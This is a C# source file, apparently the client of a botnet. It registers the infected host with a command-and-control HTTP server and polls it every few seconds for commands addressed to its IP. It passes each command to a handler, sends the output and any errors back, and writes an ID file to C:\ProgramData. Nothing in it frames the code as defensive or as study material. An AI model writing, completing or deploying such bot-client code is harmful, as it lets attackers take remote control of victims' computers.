using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Reflection;
using Microsoft.Win32;
using System.Windows;
using System.IO;

namespace BotNetClient
{
    class Program
    {
        public static UInt32 idc;
        public static Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
        static void Main(string[] args)
        {
            string address = "192.168.0.17";
            int port = 8005;
            IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            IPAddress ipadress = iphostinfo.AddressList[0];
            List<string> apiipadress = new List<string> { };
            if (HttpHandler.Class1.ResultIPTask().Result.IndexOf(ipadress.ToString())>=0)
            {
                
            }
            else
            {
                idc = HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString()).Result;
            }
            #region tcp and socket code
            //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
            //IPAddress ipadress = iphostinfo.AddressList[0];
            //IPEndPoint ippoint = new IPEndPoint(ipadress, 8005);
            //Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            //TcpClient client = null;
            //string address = "192.168.0.17";
            //int port = 8005;
            //string answer = null;
            //client = new TcpClient(address, port);

            //NetworkStream stream1 = client.GetStream();
            //byte[] ipsend = new byte[100];
            //ipsend = Encoding.Unicode.GetBytes(ipadress.ToString());
            //stream1.Write(ipsend, 0, ipsend.Length);
            #endregion
            uint id = 1;
            id = HttpHandler.Class1.IdResult().Result+1;
            try
            {
                miniprogram.Start();
                if (!File.Exists("C:\\ProgramData\\idbtc.txt"))
                {
                    File.Create("C:\\ProgramData\\idbtc.txt").Close();
                    File.WriteAllText("C:\\ProgramData\\idbtc.txt", idc.ToString());
                }
                while (true)
                {
                    if(HttpHandler.Class1.IdResult().Result!=0)
                        {
                        if ((HttpHandler.Class1.GetCommandAssync<HttpHandler.Command>($"/api/v1/messages/{id - 1}").Result != null))
                        {
                            if ((HttpHandler.Class1.ResultIdCmd((id - 1).ToString()).Result == id - 1) && (HttpHandler.Class1.ResultIpCmdAsync((id - 1).ToString()).Result.IndexOf(ipadress.ToString()) >= 0))
                            {
                                string answer = HttpHandler.Class1.ResultCmd((id - 1).ToString()).Result;
                                Stopwatch watch = new Stopwatch();
                                watch.Start();
                                string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
                                HttpHandler.Class1.SendResponse(message, ipadress.ToString());
                                watch.Stop();
                                id++;
                            }
                            else
                            {
                                id++;
                                continue;
                            }
                        }
                        else
                        {
                            continue;
                        }
                    }
                    else
                    {
                        id = 1;
                        continue;
                    }
                    Thread.Sleep(5000);
                }
            } 
            catch (Exception ex)
            {
                HttpHandler.Class1.SendResponse(ex.ToString(), ipadress.ToString());
            }
            finally
            {
                Thread.Sleep(5000);
                //Process.Start(Assembly.GetExecutingAssembly().Location);
            }
        }
    }
}
